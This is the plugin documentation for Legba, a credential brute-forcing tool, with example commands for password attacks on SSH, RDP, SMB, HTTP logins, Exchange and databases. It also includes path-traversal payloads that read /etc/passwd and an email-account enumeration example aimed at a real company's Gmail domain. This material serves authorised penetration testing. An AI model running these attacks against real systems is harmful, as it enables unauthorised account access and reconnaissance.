# AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)

The AMQP binary protocol allows interaction with message queueing services like ActiveMQ, RabbitMQ, Qpid, JORAM and Solace.

## Options

| Name | Description |
| ---- | ----------- | 
| `--amqp-ssl` | Enable SSL for AMQP. |

## Examples

```sh
legba amqp \
    --target localhost:5672 \
    --username admin \
    --password data/passwords.txt
```

# DNS

DNS subdomain enumeration.

## Options

| Name | Description |
| ---- | ----------- |
| `--dns-resolvers <DNS_RESOLVERS>` | Comma separatd list of DNS resolvers to use instead of the system one. |
| `--dns-port <DNS_PORT>` | Resolver(s) port [default: `53`] |
| `--dns-attempts <DNS_ATTEMPTS>` | Number of retries after lookup failure before giving up [default: `1`] |

## Examples

```sh
legba dns \
    --payloads data/200k-dns.txt \
    --target something.com \
    --dns-resolvers "1.1.1.1" # comma separated list of DNS resolvers, do not pass to use the system resolver
```

# FTP

FTP password authentication.

## Examples

Password Authentication:

```sh
legba ftp \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:21
```

# HTTP

A set of plugins supporting http basic authentication, NTLMv1, NTLMv2, multipart form requests, standard HTTP requests, CSRF token grabbing and HTTP pages enumeration.

| Name | Description |
| ---- | ----------- |
| http       | HTTP request. |
| http.basic | HTTP basic authentication. |
| http.enum  | HTTP pages enumeration. |
| http.form  | HTTP multipart form request. |
| http.ntlm1 | NTLMv1 authentication over HTTP. |
| http.ntlm2 | NTLMv2 authentication over HTTP. |
| http.vhost | HTTP virtual host enumeration. |

## Options

| Name | Description |
| ---- | ----------- | 
| `--http-success-codes <HTTP_SUCCESS_CODES>` | Comma separated status codes to consider as successful authentication attempts for HTTP based plugins [default: "200, 301, 302"] |
| `--http-random-ua` | Randomize requests User-Agent |
| `--http-success-string <HTTP_SUCCESS_STRING>` | Check for the presence of this string in the response in order to recognize a succesful attempt |
| `--http-failure-string <HTTP_FAILURE_STRING>` | Check for the presence of this string in the response in order to recognize a failed attempt |
| `--http-follow-redirects` | Follow HTTP redirects |
| `--http-method <HTTP_METHOD>` | Request method for HTTP based plugins [default: `GET`] |
| `--http-headers <HTTP_HEADERS>...` | Request headers for HTTP based plugins |
| `--http-csrf-page <HTTP_CSRF_PAGE>` | For each request grab a CSRF token from this page |
| `--http-csrf-regexp <HTTP_CSRF_REGEXP>` | Regular expression to use to grab the CSRF token name and value [default: `"<input type=\"hidden\" name=\"(token)\" value=\"([^\"]+)\""`] |
| `--http-payload <HTTP_PAYLOAD>` | Request payload (query string, post body or form data) for HTTP based plugins |
| `--http-enum-ext <HTTP_ENUM_EXT>` | File extension for HTTP enumeration [default: `php`] |
| `--http-enum-ext-placeholder <HTTP_ENUM_EXT_PLACEHOLDER>` | File extension placeholder for HTTP enumeration wordlist [default: `%EXT%`] |
| `--http-ntlm-domain <HTTP_NTLM_DOMAIN>` | Domain for NTLM authentication over HTTP |
| `--http-ntlm-workstation <HTTP_NTLM_WORKSTATION>` | Workstation name for NTLM authentication over HTTP [default: `CLIENT`] |
| `--proxy <PROXY>` | Proxy URL |
| `--proxy-auth <PROXY_AUTH>` | Proxy authentication as username:password |

## Examples

### Basic Authentication

HTTP Basic Authentication

```sh
legba http.basic \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/
```

### NTLM Authentication

HTTP Request with NTLMv1 Authentication:

```sh
legba http.ntlm1 \
    --domain example.org \
    --workstation client \
    --username admin \
    --password wordlists/passwords.txt \
    --target https://localhost:8888/
```

HTTP Request with NTLMv2 Authentication:

```sh
legba http.ntlm2 \
    --domain example.org \
    --workstation client \
    --username admin \
    --password wordlists/passwords.txt \
    --target https://localhost:8888/
```

Targeting an example Microsoft Exchange server via NTLMv2:

```sh
legba http.ntlm2 \
    --http-ntlm-domain LEGBA \
    --username jeff \
    --password wordlists/passwords.txt \
    -T "https://exchange-server/ews" \
    --http-success-codes "200, 500"
```

### Enumeration

HTTP Pages Enumeration:
 
```sh
legba http.enum \
    --payloads data/pages.txt \
    --target http://localhost:8888/ \
    --http-enum-ext php \ # php is the default value for file extensions
    --http-success-codes 200 
```

Wordpress plugin discovery using interpolation syntax:
 
```sh
legba http.enum \
    --payloads data/wordpress-plugins.txt \
    --target http://localhost:8888/wp-content/plugins/{PAYLOAD}/readme.txt \
    --http-success-codes 200 
```

LFI vulnerability fuzzing:

```sh
legba http.enum \
    --payloads data/lfi.txt \
    --target http://localhost:8888/ \
    --http-success-string "root:"
```

The `data/lfi.txt` would be something like:

```
?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
file?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
...
... and so on ...
...
```

Google Suite / GMail valid accounts enumeration:

```sh
legba http.enum \
    --payloads data/employees-names.txt \
    --http-success-string "COMPASS" \
    --http-success-codes 204 \
    --quiet \
    --target "https://mail.google.com/mail/gxlu?email={PAYLOAD}@broadcom.com" 
```

### Misc HTTP Requests

HTTP Post Request (Wordpress wp-login.php page):

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/wp-login.php \
    --http-method POST \
    --http-success-codes 302 \ # wordpress redirects on successful login
    --http-payload 'log={USERNAME}&pwd={PASSWORD}'
```

HTTP Post Request (Wordpress xmlrpc.php)

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/xmlrpc.php \
    --http-method POST \
    --http-payload '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{USERNAME}</string></value></param><param><value><string>{PASSWORD}</string></value></param></params></methodCall>' \
    --http-success-string 'isAdmin' # what string successful response will contain
```

Or using the @ syntax to load the payload from a file:

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/xmlrpc.php \
    --http-method POST \
    --http-payload @xmlrpc-payload.xml \
    --http-success-string 'isAdmin'
```

HTTP Post Request with CSRF Token grabbing:

```sh
legba http \
    --username admin \
    --password wordlists/passwords.txt \
    --target http://localhost:8888/ \
    --http-csrf-page http://localhost:8888/ \ # where to grab the CSRF token from, or empty if it's the same as --target
    --http-csrf-regexp '<input type="hidden" name="(token)" value="([^\"]+)"' \ # regular expression to extract it
    --http-method POST \
    --http-payload 'user={USERNAME}&pass={PASSWORD}'
```

Targeting an example Microsoft Exchange server via OWA:

```sh
legba http \
    --target "https://exchange-server/owa/auth.owa" \
    --username "LEGBA\jeff" \
    --password wordlists/passwords.txt \
    --http-method POST \
    --http-payload 'destination=https://exchange-server/&flags=4&username={USERNAME}&password={PASSWORD}' \
    --http-success-codes 302 \
    --http-success-string 'set-cookie'
```


# IMAP

IMAP password authentication.

## Examples

```sh
legba imap \
    --username user \
    --password data/passwords.txt \
    --target localhost:993
```

# Kerberos

Kerberos 5 Pre Auth (users enumeration and password authentication).

**NOTE:** due to the way that the realm string is uppercase'd in order to generate the cryptographic salt for Microsoft domain controllers, you'll need to add the `--kerberos-linux` argument when targeting Linux Kerberos servers.

## Options

| Name | Description |
| ---- | ----------- | 
| `--kerberos-realm <KERBEROS_REALM>` | Kerberos realm |
| `--kerberos-protocol <KERBEROS_PROTOCOL>` | Kerberos transport protocol [default: `tcp`] [possible values: `udp`, `tcp`] |
| `--kerberos-linux` | If targeting a Linux Kerberos5 implementation, pass this flag to preserve the realm string case |

## Examples

```sh
legba kerberos \
    --target 127.0.0.1 \
    --username admin \
    --password wordlists/passwords.txt \
    --kerberos-realm example.org
```


# LDAP

LDAP Password Authentication.

## Options

| Name | Description |
| ---- | ----------- | 
| `--ldap-domain <LDAP_DOMAIN>` | LDAP domain |

## Examples

```sh
legba ldap \
    --target 127.0.0.1:389 \
    --username admin \
    --password @wordlists/passwords.txt \
    --ldap-domain example.org \
    --single-match
```

# MongoDB

MongoDB password authentication.

## Examples

```sh
legba mongodb \
  --target localhost:27017 \
  --username root \
  --password data/passwords.txt
```

# MQTT

MQTT password authentication.

## Options

| Name | Description |
| ---- | ----------- | 
| `--mqtt-client-id <MQTT_CLIENT_ID>` | MQTT client identifier [default: `legba`] |
| `--mqtt-v5` | Use MQTT v5 |

## Examples

```sh
legba mqtt \
    --target 127.0.0.1:1883 \
    --username admin \
    --password wordlists/passwords.txt \
```


# Microsoft SQL

Microsoft SQL Server Password Authentication.

## Examples

```sh
legba mssql \
    --username SA \
    --password wordlists/passwords.txt \
    --target localhost:1433
```

# MySQL

MySQL Password Authentication.

## Examples

```sh
legba mysql \
    --username root \
    --password wordlists/passwords.txt \
    --target localhost:3306
```


# Oracle

Oracle Password Authentication.

**NOTE**: this is an optional feature that is not compiled by default, enable during compilation with by using `cargo build --release -F oracle`.

## Examples 

```sh
legba oracle \
    --target localhost:1521 \
    --oracle-database SYSTEM \
    --username admin \
    --password data/passwords.txt
```


# Port Scanner

TCP and UDP port scanner with http banner grabbing capabilities.

## Options

| Name | Description |
| ---- | ----------- |
| `--port-scanner-ports <PORT_SCANNER_PORTS>` |  Range or comma separated values of integer port numbers to scan [default: `1-65535`] |
| `--port-scanner-no-banners` |  Do not attempt banner grabbing |
| `--port-scanner-no-tcp` |  Do not perform TCP scan |
| `--port-scanner-no-udp` |  Do not perform UDP scan |
| `--port-scanner-banner-timeout <PORT_SCANNER_BANNER_TIMEOUT>` |  Timeout in seconds for banner grabbing [default: `1000`] |
| `--port-scanner-http <PORT_SCANNER_HTTP>` | Comma separated list of ports for HTTP grabbing [default: `"80, 8080, 8081, 8888"`] |
| `--port-scanner-https <PORT_SCANNER_HTTPS>` | Comma separated list of ports for HTTPS grabbing [default: `"443, 8443"`] |
| `--port-scanner-http-headers <PORT_SCANNER_HTTP_HEADERS>` | Comma separated list lowercase header names for HTTP/HTTPS grabbing [default: `"server, x-powered-by, location"`] |

## Examples

Scan all TCP and UDP ports with a 300ms timeout:

```sh
legba port.scanner \
    --target something.com \
    --timeout 300 
```

Scan a custom range of ports with a 300ms timeout:

```sh
legba port.scanner \
    --target something.com \
    --port-scanner-ports '80-10000' \
    --timeout 300 
```

Scan a custom list of ports with a 300ms timeout:

```sh
legba port.scanner \
    --target something.com \
    --port-scanner-ports '21, 22, 80, 443, 8080' \
    --timeout 300 
```

# PostgreSQL

PostgreSQL Password Authentication.

## Examples

```sh
legba pgsql \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:5432  
```

# POP3

POP3 password authentication.

## Options

| Name | Description |
| ---- | ----------- | 
| `--pop3-ssl` | Enable SSL for POP3 |

## Examples

Insecure:

```sh
legba pop3 \
    --username admin@example.com \
    --password wordlists/passwords.txt \
    --target localhost:110
```

Via SSL:

```sh
legba pop3 \
    --username admin@example.com \
    --password wordlists/passwords.txt \
    --target localhost:995 \
    --pop3-ssl
```

# RDP

Microsoft Remote Desktop.

## Options

| Name | Description |
| ---- | ----------- |
| `--rdp-domain <RDP_DOMAIN>` | Domain name [default: ``] |
| `--rdp-ntlm` | Use a NTLM hash instead of a password |
| `--rdp-admin-mode` | Restricted admin mode |
| `--rdp-auto-logon` | AutoLogon mode in case of SSL negotiation |

## Examples

```sh
legba rdp \
    --target localhost:3389 \
    --username admin \
    --password data/passwords.txt
```

# Redis

Redis password authentication, both legacy and ACL based.

## Options

| Name | Description |
| ---- | ----------- | 
| `--redis-ssl` | Enable SSL for Redis. |

## Examples

```sh
legba redis \
    --target localhost:6379 \
    --username admin \
    --password data/passwords.txt
```

# Samba

Samba username and password authentication.

## Options

| Name | Description |
| ---- | ----------- | 
| `--smb-workgroup <SMB_WORKGROUP>` | Samba workgroup name [default: `WORKGROUP`] |
| `--smb-share <SMB_SHARE>` | Expicitly set Samba private share to test. |

## Examples

Will try to autodetect a private share to test:

```sh
legba smb \
    --target share.company.com \
    --username admin \
    --password data/passwords.txt
```

Pass private share by hand:


```sh
legba smb \
    --target share.company.com \
    --username admin \
    --password data/passwords.txt \
    --smb-share "/private_share"
```


# ScyllaDB / Cassandra

ScyllaDB / Apache Casandra password based authentication.

## Examples

```sh
legba scylla \
    --username cassandra \
    --password wordlists/passwords.txt \
    --target localhost:9042
```


# SSH / SFTP

SSH/SFTP password and private key authentication.

## Options

| Name | Description |
| ---- | ----------- |
| `--ssh-auth-mode <SSH_AUTH_MODE>` | Authentication strategy [default: `password`] [possible values: `key`, `password`] |
| `--ssh-key-passphrase <SSH_KEY_PASSPHRASE>` | Optional private key passphrase for key based authentication. |

## Examples


SSH password based authentication:

```sh
legba ssh \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:22
```

SSH key based authentication, testing keys inside /some/path:

```sh
legba ssh \
    --username admin \
    --password '@/some/path/*' \
    --ssh-auth-mode key \
    --target localhost:22
```

SFTP password based authentication:

```sh
legba sftp \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:22
```

SFTP ley based authentication, testing keys inside /some/path:

```sh
legba sftp \
    --username admin \
    --password '@/some/path/*' \
    --ssh-auth-mode key \
    --target localhost:22
```

# SMTP

SMTP password authentication.

## Options

| Name | Description |
| ---- | ----------- | 
| `--smtp-mechanism <SMTP_MECHANISM>` | SMTP authentication mechanism, can be `PLAIN` (RFC4616), `LOGIN` (obsolete but needed for some providers like office365) or `XOAUTH2` [default: `PLAIN`] |

## Examples

```sh
legba smtp \
    --username admin@example.com \
    --password wordlists/passwords.txt \
    --target localhost:25
```

# SOCKS5

SOCKS5 username and password authentication.

## Options

| Name | Description |
| ---- | ----------- | 
| `--socks5-address <SOCKS5_ADDRESS>` | Remote address to test the proxying for [default: `ifcfg.co`] |
| `--socks5-port <SOCKS5_PORT>` | Remote port to test the proxying for [default: `80`] |

## Examples

```sh
legba socks5 \
    --target localhost:1080 \
    --username admin \
    --password data/passwords.txt
```

With alternative address:


```sh
legba socks5 \
    --target localhost:1080 \
    --username admin \
    --password data/passwords.txt \
    --socks5-address 'internal.company.com' \
    --socks5-port 8080
```


# STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)

The STOMP text protocol allows interaction with message queueing services like ActiveMQ, RabbitMQ, HornetQ and OpenMQ.

## Examples

```sh
legba stomp \
    --target localhost:61613 \
    --username admin \
    --password data/passwords.txt
```


# Telnet

Telnet password authentication.

## Options

| Name | Description |
| ---- | ----------- |
| `--telnet-user-prompt <TELNET_USER_PROMPT>` | Telnet server username login prompt string [default: `"login: "`] |
| `--telnet-pass-prompt <TELNET_PASS_PROMPT>` | Telnet server password login prompt string [default: `"Password: "`] |
| `--telnet-prompt <TELNET_PROMPT>` | Telnet server shell prompt after successful login [default: `":~$ "`] |

## Examples

```sh
legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

# VNC

VNC Password Authentication.

## Examples

```sh
legba vnc \
    --target localhost:5901 \
    --password data/passwords.txt
```

# Custom Binary

The command (cmd) plugin allows legba to interact with a custom executable and use either its exit code or a string pattern to determine a success or failure. It can be used to integrate with clients and utilities that are not natively supported by legba and parallelize their execution in order to attack credentials.

## Options

| Name | Description |
| ---- | ----------- |
| `--cmd-binary <CMD_BINARY>` | Command binary [default: not set]  |
| `--cmd-args <CMD_ARGS>` | Command arguments. {USERNAME}, {PASSWORD}, {TARGET} and {PORT} can be used as placeholders [default: not set] |
| `--cmd-success-exit-code <CMD_SUCCESS_EXIT_CODE>` | Process exit code to be considered as a positive match [default: `0`] |
| `--cmd-success-match <CMD_SUCCESS_MATCH>` | String to look for in the process standard output to be considered as a positive match |

## Examples

Use the unzip utility to find the password of a password protected ZIP archive (as seen in [this recipe](https://github.com/evilsocket/legba-cookbook/tree/main/zip)):

```sh
legba cmd \
    --single-match \
    --cmd-binary unzip \
    --cmd-args "\\-oP '{PASSWORD}' \\-d /tmp {TARGET}" \
    -U "" \
    --password wordlist.txt \
    --target data/protected.zip
```

